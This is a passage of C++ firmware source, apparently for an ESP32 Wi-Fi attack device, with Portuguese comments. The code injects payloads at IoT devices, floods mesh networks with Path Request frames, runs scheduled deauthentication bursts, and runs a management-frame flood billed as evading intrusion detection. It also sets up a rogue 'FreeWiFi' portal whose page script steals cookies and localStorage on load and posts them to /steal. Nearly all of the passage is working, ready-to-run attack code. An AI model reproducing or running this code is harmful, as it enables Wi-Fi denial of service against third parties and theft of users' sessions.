        memcpy(&packet[4], target_bssid, 6);

        // Source (random)
        generateRandomMac(&packet[10]);

        // BSSID
        memcpy(&packet[16], target_bssid, 6);

        // Payload data
        int payload_idx = payload_count % 5;
        const char* payload = common_payloads[payload_idx];
        int payload_len = strlen(payload);
        memcpy(&packet[24], payload, payload_len);

        // Envia frame
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 24 + payload_len, false);
        payload_count++;

        // Atualiza display
        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("IoT Exploit");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Alvo: " + target_ssid);
            padprintln("Vendor: " + String(entry.vendor));
            padprintln("");
            padprintln("Payloads enviados: " + String(payload_count));
            padprintln("Tipo: " + String(entry.device_type));
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        vTaskDelay(100 / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    WiFi.disconnect();
    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 6. 802.11s MESH DISRUPTOR - IMPLEMENTAÇÃO COMPLETA
//================================================================================

std::vector<MeshNetwork> detectMeshNetworks() {
    std::vector<MeshNetwork> meshes;
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        // Simple logic: assume hidden or specific OUI might be mesh for now
        // This is still a simplified detection but better than an empty vector
        if (WiFi.SSID(i).length() == 0) {
            MeshNetwork mesh;
            memcpy(mesh.bssid, WiFi.BSSID(i), 6);
            mesh.channel = WiFi.channel(i);
            mesh.rssi = WiFi.RSSI(i);
            meshes.push_back(mesh);
        }
    }
    return meshes;
}

void meshDisruptor() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Mesh Disruptor");
    padprintln("");
    padprintln("Procurando redes mesh...");
    padprintln("Monitorando todos os canais");

    // Path Request frame template (IEEE 802.11s)
    uint8_t path_request_frame[] = {
        0xD0, 0x00, // Action frame
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA (to be filled)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence
        0x0D,       // Category: Mesh
        0x00,       // Action: Path Request
        // Mesh IE
        0x11,       // Mesh ID IE
        0x00,       // Length (0 for wildcard)
        0x12,       // Mesh Configuration IE
        0x07,       // Length
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };

    uint8_t mac_addr[6];
    generateRandomMac(mac_addr);

    attack_running = true;
    uint32_t frame_count = 0;
    uint32_t last_update = millis();
    int channel_idx = 0;

    while (attack_running) {
        // Muda de canal
        current_channel = wifi_channels[channel_idx % 11];
        esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);

        // Atualiza MAC e BSSID
        generateRandomMac(mac_addr);
        memcpy(&path_request_frame[10], mac_addr, 6);
        memcpy(&path_request_frame[16], mac_addr, 6);

        // Envia múltiplos path requests
        for (int i = 0; i < 10; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, path_request_frame, sizeof(path_request_frame), false);
            frame_count++;
            vTaskDelay(5 / portTICK_PERIOD_MS);
        }

        channel_idx++;

        // Atualiza display
        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("Mesh Disruptor");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Enviando Path Request frames...");
            padprintln("");
            padprintln("Frames: " + String(frame_count));
            padprintln("Canal: " + String(current_channel));
            padprintln("");
            tft.setTextColor(TFT_YELLOW);
            padprintln("Redes mesh serao afetadas");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 7. SMART DEAUTH SCHEDULER - IMPLEMENTAÇÃO COMPLETA
//================================================================================

static DeauthSchedule active_schedule;
static bool scheduler_active = false;

void smartDeauthScheduler() {
    // Scan networks
    drawMainBorderWithTitle("Smart Deauth");
    padprintln("");
    padprintln("Escaneando redes...");

    int nets = WiFi.scanNetworks(false, true);

    if (nets == 0) {
        displayError("Nenhuma rede encontrada", true);
        return;
    }

    // Menu para selecionar rede
    int sel_net = -1;
    options.clear();
    for (int i = 0; i < nets; i++) {
        String name = WiFi.SSID(i);
        if (name.length() == 0) name = "<Hidden>";
        name = name.substring(0, 18) + " ch." + String(WiFi.channel(i));
        int idx = i;
        options.push_back({name.c_str(), [&sel_net, idx]() { sel_net = idx; }});
    }
    addOptionToMainMenu();

    loopOptions(options, MENU_TYPE_SUBMENU, "Selecione Alvo");

    if (returnToMenu || sel_net < 0) return;

    // Configuração do agendamento
    options.clear();
    options.push_back({"Continuo (1min)", [&]() {
        active_schedule.interval_ms = 60000;
        active_schedule.packets_per_burst = 10;
    }});
    options.push_back({"Lento (5min)", [&]() {
        active_schedule.interval_ms = 300000;
        active_schedule.packets_per_burst = 5;
    }});
    options.push_back({"Agressivo (30s)", [&]() {
        active_schedule.interval_ms = 30000;
        active_schedule.packets_per_burst = 20;
    }});
    options.push_back({"Stealth (10min)", [&]() {
        active_schedule.interval_ms = 600000;
        active_schedule.packets_per_burst = 3;
    }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Modo");

    if (returnToMenu) return;

    // Configura alvo
    int selected = sel_net;
    active_schedule.target_ssid = WiFi.SSID(selected);
    memcpy(active_schedule.target_bssid, WiFi.BSSID(selected), 6);
    active_schedule.channel = WiFi.channel(selected);

    if (!initAdvancedAttackMode()) return;

    // Prepara deauth frame
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[4], (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6);
    memcpy(&deauth_frame[10], active_schedule.target_bssid, 6);
    memcpy(&deauth_frame[16], active_schedule.target_bssid, 6);

    esp_wifi_set_channel(active_schedule.channel, WIFI_SECOND_CHAN_NONE);

    attack_running = true;
    scheduler_active = true;
    uint32_t burst_count = 0;
    uint32_t total_frames = 0;
    uint32_t last_burst = millis();
    uint32_t last_update = millis();

    while (attack_running) {
        uint32_t now = millis();

        // Envia burst se intervalo passou
        if (now - last_burst >= active_schedule.interval_ms) {
            for (int i = 0; i < active_schedule.packets_per_burst; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                total_frames += 3;
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
            burst_count++;
            last_burst = now;
        }

        // Atualiza display
        if (now - last_update > 500) {
            drawMainBorderWithTitle("Smart Deauth");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Alvo: " + active_schedule.target_ssid);
            padprintln("Canal: " + String(active_schedule.channel));
            padprintln("BSSID: " + macToString(active_schedule.target_bssid));
            padprintln("");
            padprintln("Bursts: " + String(burst_count));
            padprintln("Frames total: " + String(total_frames));
            padprintln("Intervalo: " + String(active_schedule.interval_ms / 1000) + "s");

            // Tempo até próximo burst
            uint32_t next_burst = (active_schedule.interval_ms - (now - last_burst)) / 1000;
            padprintln("Proximo em: " + String(next_burst) + "s");
            padprintln("");
            padprintln("ESC para parar");
            last_update = now;
        }

        vTaskDelay(100 / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            attack_running = false;
            scheduler_active = false;
        }
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 8. ENCRYPTED TRAFFIC FINGERPRINT - IMPLEMENTAÇÃO COMPLETA
//================================================================================

TrafficFingerprint analyzeTraffic(const std::vector<uint16_t>& packet_sizes,
                                   const std::vector<uint32_t>& intervals) {
    TrafficFingerprint fp;
    memset(&fp, 0, sizeof(fp));

    if (packet_sizes.empty()) return fp;

    // Calcula média de tamanho
    uint32_t size_sum = 0;
    for (uint16_t size : packet_sizes) {
        size_sum += size;
    }
    fp.avg_packet_size = size_sum / packet_sizes.size();

    // Calcula média de intervalos
    if (!intervals.empty()) {
        uint32_t interval_sum = 0;
        for (uint32_t interval : intervals) {
            interval_sum += interval;
        }
        fp.avg_interval_ms = interval_sum / intervals.size();

        // Calcula variância
        uint32_t variance_sum = 0;
        for (uint32_t interval : intervals) {
            int32_t diff = interval - fp.avg_interval_ms;
            variance_sum += diff * diff;
        }
        fp.variance = variance_sum / intervals.size();
    }

    // Detecta OS baseado em padrões
    // iOS: intervalos mais regulares, pacotes menores
    // Android: intervalos variáveis, pacotes maiores
    // Windows: intervalos longos, pacotes médios
    // Linux: intervalos irregulares, pacotes variados

    if (fp.avg_packet_size < 500 && fp.variance < 10000) {
        strcpy(fp.detected_os, "iOS");
        strcpy(fp.device_type, "iPhone/iPad");
        fp.confidence = 75;
    } else if (fp.avg_packet_size > 800 && fp.variance > 20000) {
        strcpy(fp.detected_os, "Android");
        strcpy(fp.device_type, "Phone/Tablet");
        fp.confidence = 70;
    } else if (fp.avg_interval_ms > 1000 && fp.avg_packet_size > 500) {
        strcpy(fp.detected_os, "Windows");
        strcpy(fp.device_type, "PC/Laptop");
        fp.confidence = 65;
    } else if (fp.variance > 50000) {
        strcpy(fp.detected_os, "Linux");
        strcpy(fp.device_type, "Server/PC");
        fp.confidence = 60;
    } else {
        strcpy(fp.detected_os, "Unknown");
        strcpy(fp.device_type, "Unknown");
        fp.confidence = 30;
    }

    return fp;
}

// encryptedTrafficFingerprint() is defined in wifi_heatmap.cpp

//================================================================================
// 9. ROGUE AP SESSION HIJACK PORTAL - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void setSessionCallback(SessionCallback callback) {
    session_callback = callback;
}

String generateHijackPage(const String& target_domain) {
    String page =
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "<title>Network Login</title>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "<style>"
        "body{font-family:Arial,sans-serif;background:#f0f0f0;padding:20px;}"
        ".container{background:white;padding:30px;border-radius:10px;max-width:400px;margin:auto;}"
        "h1{color:#333;text-align:center;}"
        "input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px;}"
        "button{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;}"
        "</style>"
        "<script>"
        "function stealSession(){"
        "  var cookies=document.cookie;"
        "  var storage={};"
        "  for(var i=0;i<localStorage.length;i++){"
        "    var k=localStorage.key(i);"
        "    storage[k]=localStorage.getItem(k);"
        "  }"
        "  var data=new FormData();"
        "  data.append('cookies',cookies);"
        "  data.append('storage',JSON.stringify(storage));"
        "  data.append('userAgent',navigator.userAgent);"
        "  data.append('url',window.location.href);"
        "  fetch('/steal',{method:'POST',body:data});"
        "}"
        "window.onload=stealSession;"
        "</script>"
        "</head>"
        "<body>"
        "<div class='container'>"
        "<h1>Conectando...</h1>"
        "<p style='text-align:center'>Por favor aguarde</p>"
        "</div>"
        "</body>"
        "</html>";
    return page;
}

void sessionHijackPortal() {
    // Inicia Evil Portal com capacidade de sequestro de sessão
    drawMainBorderWithTitle("Session Hijack Portal");
    padprintln("");
    padprintln("Configurando portal malicioso...");

    String ap_name = keyboard("FreeWiFi", 32, "Nome do AP:");
    if (ap_name.length() == 0) {
        returnToMenu = true;
        return;
    }

    if (!initAdvancedAttackMode()) return;

    // Inicia AP
    WiFi.mode(WIFI_MODE_AP);
    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ap_name);

    // Inicia DNS
    DNSServer dnsServer;
    dnsServer.start(53, "*", apIP);

    // Inicia servidor web
    AsyncWebServer server(80);

    // Captura sessões
    captured_sessions.clear();

    // Rota principal - serve página de sequestro
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        String page = generateHijackPage("");
        request->send(200, "text/html", page);
    });

    // Captura dados roubados
    server.on("/steal", HTTP_POST, [](AsyncWebServerRequest *request) {
        CapturedSession session;
        memset(&session, 0, sizeof(session));
        session.timestamp = millis();

        // Extrai dados
        for (int i = 0; i < request->args(); i++) {
            String name = request->argName(i);
            String value = request->arg(i);

            if (name == "cookies") {
                session.cookies = value;
            } else if (name == "userAgent") {
                session.user_agent = value;
            } else if (name == "url") {
                session.domain = value;
            }
        }

        captured_sessions.push_back(session);

        // Callback
        if (session_callback) {
            session_callback(session);
        }

        request->send(200, "text/plain", "OK");
    });

    // Captura tudo
    server.onNotFound([](AsyncWebServerRequest *request) {
        String page = generateHijackPage("");
        request->send(200, "text/html", page);
    });

    server.begin();

    attack_running = true;
    uint32_t last_update = millis();

    while (attack_running) {
        dnsServer.processNextRequest();

        // Atualiza display
        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Session Hijack");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("AP: " + ap_name);
            padprintln("IP: " + apIP.toString());
            padprintln("");
            tft.setTextColor(TFT_GREEN);
            padprintln("Sessoes capturadas: " + String(captured_sessions.size()));
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");

            // Mostra última sessão
            if (!captured_sessions.empty()) {
                CapturedSession last = captured_sessions.back();
                padprintln("Ultimo user-agent:");
                padprintln(last.user_agent.substring(0, 30));
                if (last.cookies.length() > 0) {
                    padprintln("Cookies: SIM");
                }
            }

            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        vTaskDelay(50 / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    server.end();
    dnsServer.stop();
    WiFi.softAPdisconnect();
    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// 10. MANAGEMENT FRAME LIMITER BYPASS FLOOD - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void mgmtFrameBypassFlood() {
    MgmtFloodConfig config;

    // Menu de configuração
    options.clear();
    options.push_back({"Stealth (30/s)", [&]() {
        config.frames_per_second = 30;
        config.randomize_mac = true;
        config.rotate_channels = true;
    }});
    options.push_back({"Moderado (50/s)", [&]() {
        config.frames_per_second = 50;
        config.randomize_mac = true;
        config.rotate_channels = true;
    }});
    options.push_back({"Agressivo (100/s)", [&]() {
        config.frames_per_second = 100;
        config.randomize_mac = true;
        config.rotate_channels = true;
    }});
    options.push_back({"Focado", [&]() {
        config.frames_per_second = 40;
        config.randomize_mac = true;
        config.rotate_channels = false;
        config.start_channel = 6;
        config.end_channel = 6;
    }});
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Modo");

    if (returnToMenu) return;

    if (!initAdvancedAttackMode()) return;

    // Frame templates
    uint8_t beacon_frame[72];
    uint8_t probe_req_frame[48];
    uint8_t auth_frame[30];

    // Beacon frame
    memset(beacon_frame, 0, sizeof(beacon_frame));
    beacon_frame[0] = 0x80;
    beacon_frame[1] = 0x00;
    memset(&beacon_frame[4], 0xFF, 6);
    beacon_frame[34] = 0x31;
    beacon_frame[36] = 0x00;
    beacon_frame[37] = 0x00;
    beacon_frame[38] = 0x01;
    beacon_frame[39] = 0x08;
    beacon_frame[40] = 0x82;
    beacon_frame[41] = 0x84;
    beacon_frame[42] = 0x8b;
    beacon_frame[43] = 0x96;
    beacon_frame[44] = 0x03;
    beacon_frame[45] = 0x01;
    beacon_frame[46] = 1;

    // Probe request
    memset(probe_req_frame, 0, sizeof(probe_req_frame));
    probe_req_frame[0] = 0x40;
    probe_req_frame[1] = 0x00;
    memset(&probe_req_frame[4], 0xFF, 6);
    probe_req_frame[10] = 0x00;
    probe_req_frame[11] = 0x00;

    // Auth frame
    memset(auth_frame, 0, sizeof(auth_frame));
    auth_frame[0] = 0xB0;
    auth_frame[1] = 0x00;
    memset(&auth_frame[4], 0xFF, 6);
    auth_frame[24] = 0x00;
    auth_frame[26] = 0x01;
    auth_frame[28] = 0x00;

    attack_running = true;
    uint32_t frame_count = 0;
    uint32_t last_update = millis();
    uint16_t interval_ms = 1000 / config.frames_per_second;
    int channel_idx = 0;
    uint8_t mac[6];

    while (attack_running) {
        // Gera MAC aleatório
        generateRandomMac(mac);

        // Atualiza canais
        if (config.rotate_channels) {
            current_channel = config.start_channel + (channel_idx % (config.end_channel - config.start_channel + 1));
            esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
        }

        // Atualiza MACs nos frames
        memcpy(&beacon_frame[10], mac, 6);
        memcpy(&beacon_frame[16], mac, 6);
        beacon_frame[46] = current_channel;

        memcpy(&probe_req_frame[10], mac, 6);
        memcpy(&probe_req_frame[16], mac, 6);

        memcpy(&auth_frame[10], mac, 6);
        memcpy(&auth_frame[16], mac, 6);

        // Envia frames alternados
        int frame_type = frame_count % 3;
        if (frame_type == 0) {
            esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
        } else if (frame_type == 1) {
            esp_wifi_80211_tx(WIFI_IF_AP, probe_req_frame, sizeof(probe_req_frame), false);
        } else {
            esp_wifi_80211_tx(WIFI_IF_AP, auth_frame, sizeof(auth_frame), false);
        }

        frame_count++;
        channel_idx++;

        // Atualiza display
        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("Mgmt Frame Bypass");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Enviando frames furtivos...");
            padprintln("");
            padprintln("Frames/s: " + String(config.frames_per_second));
            padprintln("Total: " + String(frame_count));
            padprintln("Canal: " + String(current_channel));
            padprintln("");
            tft.setTextColor(TFT_YELLOW);
            padprintln("Modo: Abaixo do radar WIDS");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        // Controle de taxa
        vTaskDelay(interval_ms / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            attack_running = false;
        }
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}
